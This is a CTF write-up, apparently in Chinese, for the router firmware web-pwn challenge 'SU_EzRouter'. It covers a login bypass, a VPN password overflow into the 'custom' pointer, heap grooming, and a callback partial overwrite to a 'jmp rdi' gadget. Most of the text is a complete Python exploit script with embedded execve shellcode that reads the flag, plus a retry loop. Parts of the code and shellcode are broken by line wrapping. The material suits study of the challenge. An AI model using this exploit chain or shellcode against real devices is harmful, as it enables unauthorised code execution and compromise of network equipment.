# SU_EzRouter

## 题目简述
题目是一套路由器管理系统，也是一道固件 Web Pwn。Web 层由 `http` 负责路由和鉴权，多个 CGI 再通过 IPC 把配置消息发给后台 `mainproc`。关键点是 `mainproc` 启动时会把一段 heap 页改成可执行，VPN 配置对象中又存在 `password` 字段越界写；利用链通过堆布局把越界写转化为 `custom` 指针劫持，再用 `Edit_VPN_Custom` 改写回调函数指针，最后跳到堆上 shellcode。

出题人 WP 中给出的关键结构是：`vpn.cgi` 与 `mainproc` 对同一条 VPN 配置消息的结构体理解不一致，CGI 侧会限制 JSON 字段长度，但 `mainproc` 侧把 `password` 拷贝到较短字段，导致可以覆盖后面的指针字段。`custom` 字段还支持 `B64:` 前缀，便于写入原始字节，这是后续部分覆盖函数指针的稳定入口。

## 解题过程
### 认证与 IPC 路线

前端存在认证旁路，访问 `/www/http?auth=1&action=login` 可以直接得到 `session_id`，不需要正常用户名密码。拿到 cookie 后，通过 `vpn.cgi`、`wifi.cgi`、`list.cgi` 等接口触发后端 IPC：

```text
http -> cgi -> mainproc
```

其中 `mainproc` 会处理 `Set_WIFI`、`Add_MAC`、`Set_VPN`、`Edit_VPN_Custom`、`Apply_VPN` 等消息。`download.cgi` 固定读取当前目录下的 `./FILE`，所以利用成功后只要让 shellcode 把 flag 写入 `FILE`，再访问下载接口即可取回结果。

### 结构体错位与 VPN 漏洞

`vpn.cgi` 侧会从 JSON 中解析 `name/proto/server/user/pass/cert/custom` 等字段，再发给 `mainproc`。CGI 侧对每个字段有长度检查，但后端 `mainproc` 使用的 VPN 对象布局不同：`pass` 在后端结构体里对应较短缓冲区，继续拷贝会覆盖后面的 `custom` 指针。

`Set_VPN` 会创建 VPN 对象，初始化默认回调为 `default_vpn_apply`，并为 `custom` 单独申请堆块。`Edit_VPN_Custom` 后续不会重新校验 `custom` 指针是否合法，而是直接向当前 `custom` 指向的位置写数据。这样漏洞链就变成两步：

1. 用 `Set_VPN` 的 `pass` 溢出部分覆盖 `custom` 指针。
2. 用 `Edit_VPN_Custom` 把写入目标从普通 custom 缓冲区变成 VPN 对象里的回调函数指针槽位。

出题人 WP 中提到，`custom` 字段支持 `B64:` 形式，后端会先 base64 解码再写入。这个细节很关键，因为它允许稳定写入 `\x00` 等非文本字节。回调函数指针与 `custom` 指针之间的偏移约为 `0xd8`，实际利用时就是围绕这个偏移做部分覆盖。

### 堆布局与控制流劫持

`mainproc` 启动时调用 `make_heap_executable`，主动把一页 heap 改成可执行，因此不必再绕 NX。利用阶段先用黑白名单和 WiFi 配置做堆布局：

- `list.cgi` 添加 MAC 黑白名单会产生稳定大小的 heap 分配。
- `wifi.cgi` 保存 SSID/password 也会消耗固定 chunk。
- 调整这些分配数量，可以控制后续 VPN 对象和 custom 堆块的大致位置。

目标是让 VPN 对象里的回调槽位与 custom 指针之间只需要低位部分覆盖即可互相指向。当前脚本的做法是先把 stage2 shellcode 放入 `custom` 堆块，再利用 `pass` 溢出把 `custom` 指针改到回调槽位附近。

随后发送 `Edit_VPN_Custom`。由于 `custom` 已经被改成回调槽位，这一步表面上是在改 custom，实际是在覆盖 `default_vpn_apply` 的函数指针。这里不直接写完整 shellcode 地址，而是把函数指针低位改成程序内的 `jmp rdi` gadget；两者同在 `mainproc` 代码段，高位一致，部分覆盖更稳定。

`Apply_VPN` 调用回调时，`rdi` 中保存当前 VPN 对象地址。回调被改成 `jmp rdi` 后，执行流跳到 VPN 对象开头；对象头部再布置一个短跳板，跳到真正的 stage2 shellcode。完整链路是：

```text
Apply_VPN
  -> callback 被部分覆盖为 jmp rdi
  -> 跳到当前 VPN 对象
  -> 对象头部跳板
  -> custom/stage2 shellcode
  -> 写 flag 到 ./FILE
  -> download.cgi 取回
```

下面脚本是当前 raw 中保留的利用实现，核心参数包括登录绕过、堆布局请求、`Set_VPN` 放置 shellcode、`Edit_VPN_Custom` 部分覆盖和 `Apply_VPN` 触发：

```python
import argparse
import base64
import re
import time

import requests

DEFAULT_URL = "http://web-c54759693e.adworld.xctf.org.cn:80"
FLAG_MARKER = b"__FLAG2__\n"

# Prebuilt shellcode for:
# mov rsp, rbp
# execve("/bin/sh", ["/bin/sh", "-c", "{ echo __FLAG2__; cat /app/flag; }
>./FILE"], NULL)
#
# This is embedded directly so the exploit does not depend on local
```

$$
binutils/as.
$$

```
STAGE2_SHELLCODE_HEX = (
```

"4889ec48b801010101010101015048b82e63686f2e726901483104244889e748b8010101010101
010150"

"48b82e47484d440101014831042448b861673b207d203e2e5048b8202f6170702f666c5048b832

5f5f3b"

"206361745048b86f205f5f464c41475048b801010101010101015048b82c62017a216462694831
042448"

"b801010101010101015048b82e63686f2e7269014831042431f6566a135e4801e6566a185e4801
e6566a"

```python
"185e4801e6564889e631d26a3b580f05"
)

def build_proxies(proxy: str | None) -> dict[str, str] | None:
if not proxy:
return None
return {"http": proxy, "https": proxy}

def build_session(proxy: str | None) -> requests.Session:
session = requests.Session()
session.trust_env = False
proxies = build_proxies(proxy)
if proxies:
session.proxies.update(proxies)
return session

def write_log(line: str, log_file: str | None) -> None:
print(line)
if log_file:
with open(log_file, "a", encoding="utf-8", errors="ignore") as fp:
fp.write(line + "\n")

def dump_response(name: str, response: requests.Response, verbose: bool,
log_file: str | None) -> None:
if not verbose:
return
snippet = response.content[:120]
cookie = response.headers.get("Set-Cookie", "")
write_log(
f"[{name}] status={response.status_code} len={len(response.content)}
cookie={cookie!r} body={snippet!r}",
log_file,
)

def restart_target(url: str, proxy: str | None, timeout: float, wait_after:
float) -> None:
session = build_session(proxy)
try:
session.get(
f"{url}/cgi-bin/restart.sh",

timeout=timeout,
allow_redirects=False,
)
except requests.RequestException:
# Some instances hang the connection while restart still succeeds.
pass
finally:
session.close()
time.sleep(wait_after)

def login_bypass(session: requests.Session, url: str, timeout: float) -> str |
None:
response = session.get(
f"{url}/www/http?auth=1&action=login",
timeout=timeout,
allow_redirects=False,
)
sid = session.cookies.get("session_id")
if sid:
return sid

match = re.search(r"session_id=([0-9a-f]+)", response.headers.get("Set-
Cookie", ""))
if not match:
return None

sid = match.group(1)
session.cookies.set("session_id", sid)
return sid

def post_bytes(
session: requests.Session,
url: str,
path: str,
body: bytes,
content_type: str,
timeout: float,
) -> requests.Response:
return session.post(
f"{url}{path}",
data=body,
headers={"Content-Type": content_type},
timeout=timeout,
)

def exploit_once(
session: requests.Session,

url: str,
timeout: float,
verbose: bool,
log_file: str | None,
) -> tuple[bool, bytes]:
steps = [
("list0", "/cgi-bin/list.cgi",
b"action=add_black&idx=0&mac=00:11:22:33:44:51&note=hacker0", "application/x-
www-form-urlencoded"),
("list1", "/cgi-bin/list.cgi",
b"action=add_black&idx=1&mac=00:11:22:33:44:51&note=hacker1", "application/x-
www-form-urlencoded"),
("list2", "/cgi-bin/list.cgi",
b"action=add_black&idx=2&mac=00:11:22:33:44:51&note=hacker2", "application/x-
www-form-urlencoded"),
("wifi", "/cgi-bin/wifi.cgi",
b"action=save&ssid=test&password=12345678", "application/x-www-form-
urlencoded"),
]
for name, path, body, content_type in steps:
response = post_bytes(session, url, path, body, content_type, timeout)
dump_response(name, response, verbose, log_file)

stage2 = bytes.fromhex(STAGE2_SHELLCODE_HEX)
pad = b"\x90" * 0x30 + stage2
pad = pad.ljust(0x3EB, b"A")

set_body = (

b'{"action":"set","name":"\xe9\xdb","proto":"p","server":"server","user":"U",'
b'"pass":"PPPPPPPPPPPPPPPPPPPPPPPPPPPPPPPP","cert":"","custom":"'
+ pad
+ b'"}'
)
edit_body = (
b'{"action":"edit","custom":"B64:'
+ base64.b64encode((0xBC2F).to_bytes(2, "little"))
+ b'"}'
)
apply_body = b'{"action":"apply","name":"target_vpn"}'

for name, body in (("set", set_body), ("edit", edit_body), ("apply",
apply_body)):
response = post_bytes(session, url, "/cgi-bin/vpn.cgi", body,
"application/json", timeout)
dump_response(name, response, verbose, log_file)
time.sleep(0.2)

time.sleep(0.8)
download = session.get(f"{url}/cgi-bin/download.cgi", timeout=timeout)
dump_response("download", download, verbose, log_file)
data = download.content
return data.startswith(FLAG_MARKER), data

def main() -> int:
parser = argparse.ArgumentParser()
parser.add_argument("--url", default=DEFAULT_URL, help="Target base URL")
parser.add_argument("--proxy", default=None, help="Optional HTTP proxy,
for example http://127.0.0.1:8080")
parser.add_argument("--timeout", type=float, default=8.0, help="Per-
request timeout in seconds")
parser.add_argument("--restart-timeout", type=float, default=4.0,
help="restart.sh timeout in seconds")
parser.add_argument("--restart-wait", type=float, default=0.8, help="Sleep
after restart in seconds")
parser.add_argument("--attempts", type=int, default=0, help="Number of
attempts, 0 means infinite")
parser.add_argument("--verbose", action="store_true", help="Print each
request step and a response snippet")
parser.add_argument("--log-file", default=None, help="Optional file path
to append logs to")
args = parser.parse_args()

attempt = 0
while args.attempts == 0 or attempt < args.attempts:
attempt += 1
write_log(f"[attempt {attempt}] restart", args.log_file)
restart_target(args.url, args.proxy, args.restart_timeout,
args.restart_wait)

session = build_session(args.proxy)
try:
sid = login_bypass(session, args.url, args.timeout)
if not sid:
write_log("login failed: no session_id", args.log_file)
continue

write_log(f"[attempt {attempt}] sid={sid}", args.log_file)
ok, data = exploit_once(session, args.url, args.timeout,
args.verbose, args.log_file)
if ok:
text = data.decode("latin1", "ignore")
write_log(text, args.log_file)
return 0

head = data[:8]
write_log(f"[attempt {attempt}] miss head={head!r}", args.log_file)
except requests.RequestException as exc:
write_log(f"[attempt {attempt}] request error: {exc}",
args.log_file)
finally:
session.close()

return 1

if __name__ == "__main__":
raise SystemExit(main())
```

## 方法总结
- 核心技巧：固件 Web Pwn + 可执行堆函数指针劫持
- 识别信号：前端鉴权弱、后端进程存在配置字段溢出，且堆页可执行。
- 复用要点：先通过 Web/CGI 到达 mainproc 消息处理，再用堆布局和部分覆盖控制函数指针，最后通过下载接口取回结果。
